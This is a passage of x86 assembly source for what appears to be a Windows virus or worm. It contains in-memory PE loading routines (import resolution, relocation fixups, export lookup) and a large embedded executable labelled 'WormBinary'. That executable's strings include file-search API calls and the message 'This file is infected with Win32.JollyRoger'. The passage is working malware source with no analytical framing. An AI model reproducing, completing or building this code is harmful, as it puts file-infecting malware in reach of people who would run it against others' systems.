;we add the new handle to the end of the list of pehandles
mov dword ptr [eax.PEHANDLE.imported_dlls],edx
mov eax,edx

HandleOfImportedFound:

mov edx,eax
xchg edx,ebx

mov dword ptr [esp.Pushad_struc.Pushad_edx],edx
mov dword ptr [esp.Pushad_struc.Pushad_ebx],ebx

popad ;restoring regs with this information:
;esi-> array of pointers to names of imported functions
;edi-> array of pointers to destinations of VAs of imported functions
;edx-> MZ
;ebx-> pehandle of the loaded module

;now,we can resolve imports of this module

mov ebx,[ebx.PEHANDLE.base]

NextImportedFunction:

cmp dword ptr [esi],00000000h
jz EndImportingFunctions
push esi
mov esi,[esi]
add esi,edx
add esi,2
call PEGetProcAddr
pop esi
;eax->function
stosd
lodsd
jmp NextImportedFunction

EndImportingFunctions:

popad
popfd
ret
;;;;;;;;;;;;

;;;;;;;;;;;;
;eax->pehandle node
;the function will return a pointer to the last pehandle node
GoEndListOfPEhandles:
pushad
pushfd
xor edx,edx
SearchEndOfListOfPEhandles:
or eax,eax
jz EndOfListOfPEhandlesFound
mov edx,eax
mov eax,[eax.PEHANDLE.imported_dlls]
jmp SearchEndOfListOfPEhandles

EndOfListOfPEhandlesFound:
popfd
mov dword ptr [esp.Pushad_struc.Pushad_eax],edx
popad
ret
;;;;;;;;;;;;

;;;;;;;;;;;;
;esi->name of dll
;eax->first pehandle
;it will return a pointer to the found pehandle or null if not found
SearchDllHandleByName:
pushad
pushfd

ISearchDllHandleByName:
or eax,eax
jz HandleByModuleNameFound
mov ebx,[eax.PEHANDLE.base]
mov edx,[ebx+3ch]
add edx,ebx
mov edx,[edx.IMAGE_NT_HEADERS.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]
add edx,ebx
mov edi,[edx.IMAGE_EXPORT_DIRECTORY.ED_Name]
add edi,ebx
CompareString
or ecx,ecx
jz HandleByModuleNameFound
mov eax,[eax.PEHANDLE.imported_dlls]
jmp ISearchDllHandleByName

HandleByModuleNameFound:
popfd
mov dword ptr [esp.Pushad_struc.Pushad_eax],eax
popad
ret
;;;;;;;;;;;;

;;;;;;;;;;;;
;ebx ->MZ addr
;PE must be loaded in memory, in good associated RVAs.

ResolveRelocs:
pushad
pushfd
mov esi,ebx
add esi,dword ptr [ebx+3ch]
mov edx,ebx
sub edx,dword ptr [esi.IMAGE_NT_HEADERS.NT_OptionalHeader.OH_ImageBase] ;delta
mov esi,dword ptr [esi.IMAGE_NT_HEADERS.NT_OptionalHeader.OH_DirectoryEntries.DE_BaseReloc.DD_VirtualAddress]
or esi,esi
jz EndResolveRelocs
add esi,ebx

;esi->relocs
;ebx->current base
;edx->delta
ParseRelocations:
cmp dword ptr [esi],0
je EndResolveRelocs

mov ecx,dword ptr [esi+4]
sub ecx,8
shr ecx,1 ;ecx = n fixups

ParseFixUps:
mov ax,word ptr [esi+2*ecx+8-2]   ;parsing fixups from the last to the first one
push eax
and eax,00000FFFh			    ;eax = offset in the page of the point to relocate
mov edi,dword ptr [esi]
add edi,ebx
add edi,eax 			    ;real address for fixing up
pop eax
test eax,0000F000h
jz NoApplyThisFixUp
add dword ptr [edi],edx 	    ;adding delta
NoApplyThisFixUp:
loop ParseFixUps

add esi,[esi+4]
jmp ParseRelocations

EndResolveRelocs:

popfd
popad
ret
;;;;;;;;;;;;

;;;;;;;;;;;;
;ebx->MZ hdr
;esi->name of the exported function
;PE must be loaded in memory
PEGetProcAddr:
pushad
pushfd

mov edi,[ebx+3ch]
add edi,ebx
mov edi,dword ptr [edi.IMAGE_NT_HEADERS.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]
add edi,ebx

;edi->IMAGE_EXPORT_DIRECTORY

mov ecx,[edi.IMAGE_EXPORT_DIRECTORY.ED_NumberOfNames]
mov edx,[edi.IMAGE_EXPORT_DIRECTORY.ED_AddressOfNames]
add edx,ebx

;edx->array of pointers to functions names

SearchFunctionName:
push edi
push ecx
mov  edi,[edx+ecx*4-4]
add  edi,ebx
CompareString
mov  eax,ecx
pop  ecx
pop  edi
or   eax,eax
jz   EndSearchFunctionName
loop SearchFunctionName
EndSearchFunctionName:
or ecx,ecx
jz EndPEGetProcAddrErr

;ecx = index in the table of pointers to functions names

mov edx,[edi.IMAGE_EXPORT_DIRECTORY.ED_AddressOfNameOrdinals]
add edx,ebx
mov ax,word ptr [edx+ecx*2-2];ax = ordinal
mov edx,[edi.IMAGE_EXPORT_DIRECTORY.ED_AddressOfFunctions]
add edx,ebx
mov eax,[edx+eax*4] ;eax = addr of the function
add eax,ebx

EndPEGetProcAddrNoErr:
popfd
mov dword ptr [esp.Pushad_struc.Pushad_eax],eax
popad
ret

EndPEGetProcAddrErr:
popfd
popad
xor eax,eax
ret
;;;;;;;;;;;;

WormBinaryAddr:
call WormBinaryAddr2
WormBinaryAddr2:
pop eax
ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

WormBinary:
db 04dh, 05ah, 090h, 000h, 003h, 000h, 000h, 000h, 004h, 000h, 000h, 000h, 0ffh, 0ffh
db 000h, 000h, 0b8h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 040h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 0b8h, 000h, 000h, 000h, 00eh, 01fh, 0bah, 00eh, 000h, 0b4h
db 009h, 0cdh, 021h, 0b8h, 001h, 04ch, 0cdh, 021h, 054h, 068h, 069h, 073h, 020h, 070h
db 072h, 06fh, 067h, 072h, 061h, 06dh, 020h, 063h, 061h, 06eh, 06eh, 06fh, 074h, 020h
db 062h, 065h, 020h, 072h, 075h, 06eh, 020h, 069h, 06eh, 020h, 044h, 04fh, 053h, 020h
db 06dh, 06fh, 064h, 065h, 02eh, 00dh, 00dh, 00ah, 024h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 059h, 05ah, 01dh, 0deh, 01dh, 03bh, 073h, 08dh, 01dh, 03bh, 073h, 08dh
db 01dh, 03bh, 073h, 08dh, 0e2h, 01bh, 076h, 08dh, 01ch, 03bh, 073h, 08dh, 01bh, 018h
db 079h, 08dh, 01ah, 03bh, 073h, 08dh, 0e2h, 01bh, 077h, 08dh, 01ch, 03bh, 073h, 08dh
db 052h, 069h, 063h, 068h, 01dh, 03bh, 073h, 08dh, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 050h, 045h, 000h, 000h, 04ch, 001h, 002h, 000h, 02bh, 060h, 047h, 041h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 0e0h, 000h, 00eh, 021h, 00bh, 001h
db 006h, 000h, 000h, 042h, 000h, 000h, 000h, 004h, 000h, 000h, 000h, 000h, 000h, 000h
db 08bh, 04dh, 000h, 000h, 000h, 010h, 000h, 000h, 000h, 060h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 010h, 000h, 000h, 000h, 002h, 000h, 000h, 004h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 004h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 070h
db 000h, 000h, 000h, 002h, 000h, 000h, 000h, 000h, 000h, 000h, 002h, 000h, 000h, 000h
db 000h, 000h, 010h, 000h, 000h, 010h, 000h, 000h, 000h, 000h, 010h, 000h, 000h, 010h
db 000h, 000h, 000h, 000h, 000h, 000h, 010h, 000h, 000h, 000h, 010h, 051h, 000h, 000h
db 03ch, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 060h, 000h, 000h, 0a8h, 002h
db 000h, 000h, 000h, 016h, 000h, 000h, 01ch, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 02eh, 074h
db 065h, 078h, 074h, 000h, 000h, 000h, 04ch, 041h, 000h, 000h, 000h, 010h, 000h, 000h
db 000h, 042h, 000h, 000h, 000h, 002h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 020h, 000h, 000h, 0e0h, 02eh, 072h, 065h, 06ch
db 06fh, 063h, 000h, 000h, 0b0h, 002h, 000h, 000h, 000h, 060h, 000h, 000h, 000h, 004h
db 000h, 000h, 000h, 044h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 040h, 000h, 000h, 042h, 0c8h, 050h, 000h, 000h, 060h, 08bh
db 07dh, 024h, 0fch, 081h, 065h, 010h, 0efh, 000h, 000h, 000h, 075h, 007h, 0c7h, 045h
db 010h, 001h, 000h, 000h, 000h, 081h, 065h, 014h, 0efh, 000h, 000h, 000h, 075h, 007h
db 0c7h, 045h, 014h, 001h, 000h, 000h, 000h, 081h, 065h, 00ch, 0ffh, 0ffh, 01fh, 000h
db 075h, 007h, 0c7h, 045h, 00ch, 040h, 000h, 000h, 000h, 08bh, 0c7h, 02bh, 045h, 024h
db 08bh, 04dh, 018h, 089h, 001h, 083h, 0c0h, 010h, 03bh, 045h, 020h, 073h, 00ch, 0ffh
db 04dh, 01ch, 07ch, 007h, 0e8h, 005h, 000h, 000h, 000h, 0ebh, 0e2h, 061h, 0c9h, 0c3h
db 0c7h, 045h, 0fch, 001h, 000h, 000h, 000h, 0c7h, 045h, 0f8h, 008h, 000h, 000h, 000h
db 0e8h, 0e4h, 003h, 000h, 000h, 089h, 045h, 0c8h, 0c1h, 0e0h, 003h, 089h, 045h, 0c4h
db 0e8h, 0d1h, 003h, 000h, 000h, 089h, 045h, 0c0h, 0c1h, 0e0h, 003h, 089h, 045h, 0bch
db 08bh, 045h, 014h, 023h, 045h, 010h, 0a9h, 00fh, 000h, 000h, 000h, 074h, 013h, 0b8h
db 002h, 000h, 000h, 000h, 0e8h, 093h, 003h, 000h, 000h, 089h, 045h, 0fch, 0c1h, 0e0h
db 003h, 089h, 045h, 0f8h, 0b8h, 002h, 000h, 000h, 000h, 0e8h, 080h, 003h, 000h, 000h
db 089h, 045h, 0dch, 0d1h, 0e0h, 089h, 045h, 0d8h, 0c1h, 0e0h, 002h, 089h, 045h, 0d4h
db 0b8h, 004h, 000h, 000h, 000h, 0e8h, 068h, 003h, 000h, 000h, 0c1h, 0e0h, 003h, 089h
db 045h, 0d0h, 0e8h, 070h, 003h, 000h, 000h, 0c1h, 0e0h, 003h, 089h, 045h, 0cch, 0e8h
db 070h, 003h, 000h, 000h, 089h, 045h, 0f4h, 0c1h, 0e0h, 003h, 089h, 045h, 0e4h, 0e8h
db 062h, 003h, 000h, 000h, 089h, 045h, 0ech, 0e8h, 05fh, 003h, 000h, 000h, 089h, 045h
db 0f0h, 0c1h, 0e0h, 003h, 089h, 045h, 0e0h, 0e8h, 051h, 003h, 000h, 000h, 089h, 045h
db 0e8h, 0e8h, 04eh, 003h, 000h, 000h, 089h, 045h, 0b8h, 0c1h, 0e0h, 003h, 089h, 045h
db 0b4h, 0e8h, 040h, 003h, 000h, 000h, 089h, 045h, 0b0h, 0b8h, 01fh, 000h, 000h, 000h
db 0e8h, 00bh, 003h, 000h, 000h, 096h, 046h, 08bh, 055h, 00ch, 08bh, 045h, 0fch, 0d1h
db 0eah, 073h, 00eh, 04eh, 00fh, 084h, 027h, 001h, 000h, 000h, 04eh, 00fh, 084h, 02dh
db 001h, 000h, 000h, 0d1h, 0eah, 073h, 00eh, 04eh, 00fh, 084h, 02fh, 001h, 000h, 000h
db 04eh, 00fh, 084h, 036h, 001h, 000h, 000h, 0d1h, 0eah, 073h, 007h, 04eh, 00fh, 084h
db 032h, 001h, 000h, 000h, 0d1h, 0eah, 073h, 007h, 04eh, 00fh, 084h, 047h, 001h, 000h
db 000h, 0d1h, 0eah, 073h, 007h, 04eh, 00fh, 084h, 041h, 001h, 000h, 000h, 0d1h, 0eah
db 073h, 00eh, 04eh, 00fh, 084h, 044h, 001h, 000h, 000h, 04eh, 00fh, 084h, 045h, 001h
db 000h, 000h, 0d1h, 0eah, 073h, 00eh, 04eh, 00fh, 084h, 042h, 001h, 000h, 000h, 04eh
db 00fh, 084h, 04ch, 001h, 000h, 000h, 0d1h, 0eah, 073h, 00eh, 04eh, 00fh, 084h, 059h
db 001h, 000h, 000h, 04eh, 00fh, 084h, 05fh, 001h, 000h, 000h, 0d1h, 0eah, 073h, 007h
db 04eh, 00fh, 084h, 05eh, 001h, 000h, 000h, 0d1h, 0eah, 073h, 007h, 04eh, 00fh, 084h
db 060h, 001h, 000h, 000h, 0d1h, 0eah, 073h, 007h, 04eh, 00fh, 084h, 062h, 001h, 000h
db 000h, 0d1h, 0eah, 073h, 00eh, 04eh, 00fh, 084h, 065h, 001h, 000h, 000h, 04eh, 00fh
db 084h, 06eh, 001h, 000h, 000h, 0d1h, 0eah, 073h, 00eh, 04eh, 00fh, 084h, 070h, 001h
db 000h, 000h, 04eh, 00fh, 084h, 079h, 001h, 000h, 000h, 0d1h, 0eah, 073h, 00eh, 04eh
db 00fh, 084h, 07fh, 001h, 000h, 000h, 04eh, 00fh, 084h, 097h, 001h, 000h, 000h, 0d1h
db 0eah, 073h, 007h, 04eh, 00fh, 084h, 0a4h, 001h, 000h, 000h, 0d1h, 0eah, 073h, 007h
db 04eh, 00fh, 084h, 0a0h, 001h, 000h, 000h, 0d1h, 0eah, 073h, 007h, 04eh, 00fh, 084h
db 0a3h, 001h, 000h, 000h, 0d1h, 0eah, 073h, 00eh, 04eh, 00fh, 084h, 0a6h, 001h, 000h
db 000h, 04eh, 00fh, 084h, 0b0h, 001h, 000h, 000h, 0d1h, 0eah, 073h, 007h, 04eh, 00fh
db 084h, 0b0h, 001h, 000h, 000h, 0d1h, 0eah, 073h, 00eh, 04eh, 00fh, 084h, 0b7h, 001h
db 000h, 000h, 04eh, 00fh, 084h, 0b7h, 001h, 000h, 000h, 0d1h, 0eah, 073h, 007h, 04eh
db 00fh, 084h, 0b3h, 001h, 000h, 000h, 0e9h, 0bch, 0feh, 0ffh, 0ffh, 00ch, 088h, 0aah
db 0b0h, 0c0h, 00bh, 045h, 0e4h, 00bh, 045h, 0f0h, 0aah, 0c3h, 00ch, 08ah, 0aah, 0b0h
db 0c0h, 00bh, 045h, 0e0h, 00bh, 045h, 0f4h, 0aah, 0c3h, 0b0h, 0b0h, 00bh, 045h, 0f8h
db 00bh, 045h, 0f0h, 0aah, 0e9h, 08dh, 001h, 000h, 000h, 00ch, 0c6h, 0aah, 0b0h, 0c0h
db 0ebh, 0f0h, 0b0h, 00fh, 0aah, 0b0h, 0b6h, 00bh, 045h, 0fch, 00bh, 045h, 0d4h, 0aah
db 0b0h, 0c0h, 00bh, 045h, 0c4h, 0ebh, 0d3h, 00ch, 086h, 0aah, 0b0h, 0c0h, 00bh, 045h
db 0e0h, 00bh, 045h, 0e8h, 0aah, 0c3h, 00ch, 086h, 0aah, 0ebh, 0f1h, 0b0h, 08dh, 0aah
db 0b0h, 005h, 00bh, 045h, 0c4h, 0aah, 0e9h, 059h, 001h, 000h, 000h, 00ch, 000h, 00bh
db 045h, 0cch, 0aah, 0ebh, 099h, 00ch, 002h, 00bh, 045h, 0cch, 0aah, 0ebh, 09eh, 00ch
db 080h, 0aah, 0b0h, 0c0h, 00bh, 045h, 0cch, 00bh, 045h, 0f0h, 0aah, 0e9h, 032h, 001h
db 000h, 000h, 0f7h, 045h, 014h, 001h, 000h, 000h, 000h, 00fh, 084h, 02ch, 0feh, 0ffh
db 0ffh, 00ch, 004h, 00bh, 045h, 0cch, 0aah, 0e9h, 01ah, 001h, 000h, 000h, 00ch, 0feh
db 0aah, 0b0h, 0c0h, 00bh, 045h, 0d4h, 0e9h, 060h, 0ffh, 0ffh, 0ffh, 0b0h, 040h, 00bh
db 045h, 0d4h, 00bh, 045h, 0c8h, 0aah, 0c3h, 00ch, 0f6h, 0aah, 0b0h, 0d0h, 00bh, 045h
db 0d4h, 0e9h, 049h, 0ffh, 0ffh, 0ffh, 00ch, 084h, 0aah, 0b0h, 0c0h, 00bh, 045h, 0b4h
db 00bh, 045h, 0b0h, 0aah, 0c3h, 00ch, 0f6h, 0aah, 0b0h, 0c0h, 00bh, 045h, 0b8h, 0aah
db 0e9h, 0dbh, 000h, 000h, 000h, 0b0h, 00fh, 0aah, 0b0h, 0afh, 0aah, 0b0h, 0c0h, 00bh
db 045h, 0c4h, 00bh, 045h, 0c0h, 0aah, 0c3h, 0b0h, 069h, 0aah, 0e8h, 0eeh, 0ffh, 0ffh
db 0ffh, 0e9h, 0c4h, 000h, 000h, 000h, 00ch, 0d0h, 00bh, 045h, 0d8h, 0aah, 0b0h, 0c0h
db 00bh, 045h, 0cch, 00bh, 045h, 0f0h, 0aah, 0c3h, 00ch, 0c0h, 0aah, 0b0h, 0c0h, 00bh
db 045h, 0cch, 00bh, 045h, 0f0h, 0aah, 0e9h, 0adh, 000h, 000h, 000h, 0b0h, 00fh, 0aah
db 0b0h, 0a4h, 00bh, 045h, 0d4h, 0aah, 0b0h, 0c0h, 0e8h, 005h, 000h, 000h, 000h, 0e9h
db 098h, 000h, 000h, 000h, 0b0h, 0c0h, 00bh, 045h, 0bch, 00bh, 045h, 0c8h, 0aah, 0c3h
db 0f7h, 045h, 010h, 002h, 000h, 000h, 000h, 00fh, 084h, 078h, 0fdh, 0ffh, 0ffh, 0b0h
db 00fh, 0aah, 0b0h, 0a5h, 00bh, 045h, 0d4h, 0aah, 0ebh, 0deh, 0b0h, 00fh, 0aah, 0b0h
db 0c8h, 0ebh, 0dch, 0b0h, 00fh, 0aah, 0b0h, 0c0h, 00bh, 045h, 0fch, 0aah, 0e9h, 0e1h
db 0feh, 0ffh, 0ffh, 0b0h, 00fh, 0aah, 0b0h, 0bch, 00bh, 045h, 0dch, 0aah, 0e9h, 06eh
db 0ffh, 0ffh, 0ffh, 0b0h, 00fh, 0aah, 0b0h, 0bah, 0aah, 0b0h, 0e0h, 00bh, 045h, 0d0h
db 00bh, 045h, 0c8h, 0aah, 0ebh, 042h, 0b0h, 00fh, 0aah, 0b0h, 0a3h, 00bh, 045h, 0d0h
db 0aah, 0ebh, 09fh, 066h, 0b8h, 0ebh, 001h, 066h, 0abh, 0b8h, 000h, 001h, 000h, 000h
db 0e8h, 033h, 000h, 000h, 000h, 0aah, 0c3h, 0b0h, 026h, 00bh, 045h, 0d0h, 0aah, 0c3h
db 0b0h, 064h, 00bh, 045h, 0dch, 0aah, 0c3h, 0b0h, 0f2h, 00bh, 045h, 0dch, 0aah, 0c3h
db 083h, 07dh, 0fch, 000h, 074h, 00ah, 0e8h, 000h, 000h, 000h, 000h, 0e8h, 000h, 000h
db 000h, 000h, 0b8h, 000h, 001h, 000h, 000h, 0e8h, 002h, 000h, 000h, 000h, 0aah, 0c3h
db 060h, 050h, 0ffh, 075h, 008h, 0ffh, 055h, 028h, 083h, 0c4h, 008h, 089h, 044h, 024h
db 01ch, 061h, 00bh, 0c0h, 0c3h, 0b8h, 008h, 000h, 000h, 000h, 0e8h, 0e3h, 0ffh, 0ffh
db 0ffh, 0c3h, 08bh, 055h, 010h, 0ebh, 00dh, 08bh, 055h, 014h, 0ebh, 008h, 08bh, 055h
db 010h, 00bh, 055h, 014h, 0ebh, 000h, 0e8h, 0deh, 0ffh, 0ffh, 0ffh, 08bh, 0c8h, 083h
db 07dh, 0fch, 000h, 075h, 003h, 083h, 0e1h, 003h, 00fh, 0a3h, 0cah, 073h, 0ebh, 0c3h
db 072h, 02bh, 062h, 000h, 072h, 062h, 000h, 000h, 046h, 069h, 06eh, 064h, 043h, 06ch
db 06fh, 073h, 065h, 000h, 000h, 000h, 046h, 069h, 06eh, 064h, 04eh, 065h, 078h, 074h
db 046h, 069h, 06ch, 065h, 041h, 000h, 000h, 000h, 046h, 069h, 06eh, 064h, 046h, 069h
db 072h, 073h, 074h, 046h, 069h, 06ch, 065h, 041h, 000h, 000h, 06bh, 065h, 072h, 06eh
db 065h, 06ch, 033h, 032h, 02eh, 064h, 06ch, 06ch, 000h, 000h, 000h, 000h, 047h, 065h
db 074h, 043h, 075h, 072h, 072h, 065h, 06eh, 074h, 044h, 069h, 072h, 065h, 063h, 074h
db 06fh, 072h, 079h, 041h, 000h, 000h, 000h, 000h, 073h, 072h, 061h, 06eh, 064h, 000h
db 000h, 000h, 072h, 061h, 06eh, 064h, 000h, 000h, 000h, 000h, 048h, 065h, 061h, 070h
db 044h, 065h, 073h, 074h, 072h, 06fh, 079h, 000h, 048h, 065h, 061h, 070h, 041h, 06ch
db 06ch, 06fh, 063h, 000h, 000h, 000h, 048h, 065h, 061h, 070h, 043h, 072h, 065h, 061h
db 074h, 065h, 000h, 000h, 048h, 065h, 061h, 070h, 046h, 072h, 065h, 065h, 000h, 000h
db 000h, 000h, 071h, 073h, 06fh, 072h, 074h, 000h, 000h, 000h, 066h, 072h, 065h, 065h
db 000h, 000h, 000h, 000h, 063h, 061h, 06ch, 06ch, 06fh, 063h, 000h, 000h, 066h, 074h
db 065h, 06ch, 06ch, 000h, 000h, 000h, 066h, 073h, 065h, 065h, 06bh, 000h, 000h, 000h
db 066h, 077h, 072h, 069h, 074h, 065h, 000h, 000h, 066h, 072h, 065h, 061h, 064h, 000h
db 000h, 000h, 066h, 063h, 06ch, 06fh, 073h, 065h, 000h, 000h, 066h, 06fh, 070h, 065h
db 06eh, 000h, 000h, 000h, 047h, 065h, 074h, 054h, 069h, 063h, 06bh, 043h, 06fh, 075h
db 06eh, 074h, 000h, 000h, 000h, 000h, 046h, 072h, 065h, 065h, 04ch, 069h, 062h, 072h
db 061h, 072h, 079h, 000h, 06dh, 073h, 076h, 063h, 072h, 074h, 02eh, 064h, 06ch, 06ch
db 000h, 000h, 054h, 068h, 069h, 073h, 020h, 066h, 069h, 06ch, 065h, 020h, 069h, 073h
db 020h, 069h, 06eh, 066h, 065h, 063h, 074h, 065h, 064h, 020h, 077h, 069h, 074h, 068h
db 020h, 057h, 069h, 06eh, 033h, 032h, 02eh, 04ah, 06fh, 06ch, 06ch, 079h, 052h, 06fh
db 067h, 065h, 072h, 00ah, 020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
db 061h, 039h, 032h, 02fh, 05ah, 065h, 06ch, 06ch, 061h, 056h, 020h, 079h, 042h, 020h
db 064h, 045h, 064h, 06fh, 043h, 000h, 000h, 000h, 057h, 069h, 06eh, 033h, 032h, 02eh
db 04ah, 06fh, 06ch, 06ch, 079h, 052h, 06fh, 067h, 065h, 072h, 000h, 000h, 000h, 000h
db 04dh, 065h, 073h, 073h, 061h, 067h, 065h, 042h, 06fh, 078h, 041h, 000h, 075h, 073h
db 065h, 072h, 033h, 032h, 02eh, 064h, 06ch, 06ch, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 02bh, 060h, 047h, 041h, 000h, 000h
db 000h, 000h, 002h, 000h, 000h, 000h, 03bh, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 048h, 000h, 000h, 055h, 08bh, 0ech, 083h, 0ech, 040h, 053h, 056h, 057h, 06ah
db 014h, 058h, 033h, 0f6h, 089h, 045h, 0ech, 089h, 045h, 0f8h, 08bh, 045h, 00ch, 089h
db 075h, 0f4h, 03dh, 0a5h, 000h, 000h, 000h, 089h, 075h, 0e8h, 08dh, 0b8h, 05bh, 0ffh
db 0ffh, 0ffh, 00fh, 082h, 05eh, 002h, 000h, 000h, 03bh, 0feh, 074h, 050h, 08dh, 047h
db 0ffh, 050h, 056h, 0e8h, 040h, 036h, 000h, 000h, 059h, 02bh, 0f8h, 059h, 089h, 045h
db 0f4h, 074h, 03dh, 08dh, 047h, 0ffh, 050h, 056h, 0e8h, 02dh, 036h, 000h, 000h, 059h
db 02bh, 0f8h, 059h, 089h, 045h, 0e8h, 074h, 02ah, 08dh, 047h, 0ffh, 050h, 056h, 0e8h
db 01ah, 036h, 000h, 000h, 02bh, 0f8h, 059h, 08dh, 040h, 014h, 059h, 089h, 045h, 0ech
db 074h, 014h, 08dh, 047h, 0ffh, 050h, 056h, 0e8h, 004h, 036h, 000h, 000h, 02bh, 0f8h
db 059h, 083h, 0c0h, 014h, 059h, 089h, 045h, 0f8h, 083h, 0c7h, 078h, 06ah, 007h, 056h
db 089h, 07dh, 0f0h, 0e8h, 03ah, 036h, 000h, 000h, 059h, 089h, 045h, 00ch, 059h, 06ah
db 004h, 05fh, 03bh, 0c7h, 075h, 00fh, 06ah, 007h, 056h, 0e8h, 026h, 036h, 000h, 000h
db 059h, 089h, 045h, 00ch, 059h, 0ebh, 0edh, 06ah, 007h, 056h, 0e8h, 017h, 036h, 000h
db 000h, 03bh, 045h, 00ch, 059h, 059h, 089h, 045h, 0fch, 074h, 0eeh, 03bh, 0c7h, 074h
db 0eah, 050h, 0e8h, 0edh, 017h, 000h, 000h, 0ffh, 075h, 00ch, 08bh, 0d8h, 0e8h, 0e3h
db 017h, 000h, 000h, 057h, 00bh, 0d8h, 0e8h, 0dbh, 017h, 000h, 000h, 0ffh, 075h, 0f4h
db 08bh, 07dh, 008h, 00bh, 0d8h, 057h, 053h, 0ffh, 075h, 0fch, 0ffh, 075h, 00ch, 056h
db 06ah, 007h, 0e8h, 0fah, 002h, 000h, 000h, 08bh, 04dh, 0e8h, 08bh, 0f0h, 08bh, 045h
db 0ech, 0c6h, 004h, 03eh, 0e8h, 083h, 064h, 03eh, 001h, 000h, 046h, 003h, 0c1h, 083h
db 0c6h, 004h, 050h, 08dh, 004h, 03eh, 050h, 053h, 0ffh, 075h, 0fch, 0ffh, 075h, 00ch
db 06ah, 000h, 06ah, 00ah, 0e8h, 0ceh, 002h, 000h, 000h, 08bh, 04dh, 0f8h, 003h, 0f0h
db 083h, 0c4h, 044h, 089h, 04dh, 008h, 08dh, 014h, 03eh, 051h, 052h, 08bh, 055h, 0f0h
db 053h, 003h, 0d1h, 003h, 0d0h, 052h, 0ffh, 075h, 00ch, 06ah, 003h, 06ah, 001h, 0e8h
db 0a9h, 002h, 000h, 000h, 083h, 0c4h, 01ch, 003h, 0f0h, 03bh, 045h, 008h, 089h, 045h
db 0f8h, 074h, 052h, 089h, 045h, 0f4h, 073h, 04dh, 08bh, 04dh, 008h, 08dh, 004h, 03eh
db 02bh, 04dh, 0f4h, 051h, 050h, 053h, 0ffh, 075h, 0fch, 0ffh, 075h, 00ch, 06ah, 000h
db 06ah, 007h, 0e8h, 07ch, 002h, 000h, 000h, 083h, 0c4h, 01ch, 085h, 0c0h, 074h, 017h
db 08bh, 04dh, 0f4h, 08bh, 055h, 0f8h, 08dh, 074h, 006h, 0ffh, 08dh, 04ch, 001h, 0ffh
db 08dh, 044h, 002h, 0ffh, 089h, 045h, 0f8h, 0ebh, 007h, 08bh, 04dh, 0f4h, 0c6h, 004h
db 03eh, 090h, 041h, 046h, 0ffh, 045h, 0f8h, 03bh, 04dh, 008h, 089h, 04dh, 0f4h, 072h
db 0b3h, 06ah, 014h, 058h, 089h, 045h, 008h, 089h, 045h, 0e8h, 08bh, 045h, 0f0h, 083h
db 0c0h, 088h, 085h, 0c0h, 089h, 045h, 0ech, 074h, 029h, 048h, 050h, 06ah, 000h, 0e8h
db 0bch, 034h, 000h, 000h, 059h, 059h, 08bh, 04dh, 0ech, 02bh, 0c8h, 08dh, 040h, 014h
db 089h, 045h, 008h, 074h, 011h, 049h, 051h, 06ah, 000h, 0e8h, 0a4h, 034h, 000h, 000h
db 059h, 083h, 0c0h, 014h, 059h, 089h, 045h, 0e8h, 08bh, 04dh, 00ch, 08bh, 045h, 008h
db 089h, 04dh, 0cch, 08bh, 04dh, 014h, 089h, 04dh, 0d0h, 089h, 045h, 0d8h, 08dh, 04dh
db 0c0h, 033h, 0c0h, 051h, 050h, 089h, 05dh, 0d4h, 089h, 045h, 0c0h, 0c7h, 045h, 0c4h
db 005h, 000h, 000h, 000h, 0c7h, 045h, 0c8h, 004h, 000h, 000h, 000h, 089h, 045h, 0e0h
db 089h, 045h, 0dch, 089h, 045h, 0e4h, 0e8h, 02dh, 015h, 000h, 000h, 089h, 045h, 014h
db 08bh, 045h, 0e8h, 089h, 045h, 0d8h, 08bh, 04dh, 00ch, 033h, 0c0h, 089h, 05dh, 0d4h
db 089h, 045h, 0c0h, 089h, 045h, 0e0h, 089h, 045h, 0dch, 089h, 045h, 0e4h, 08dh, 045h
db 0c0h, 089h, 04dh, 0cch, 050h, 0c7h, 045h, 0d0h, 004h, 000h, 000h, 000h, 0ffh, 075h
db 014h, 0c7h, 045h, 0c4h, 001h, 000h, 000h, 000h, 0c7h, 045h, 0c8h, 003h, 000h, 000h
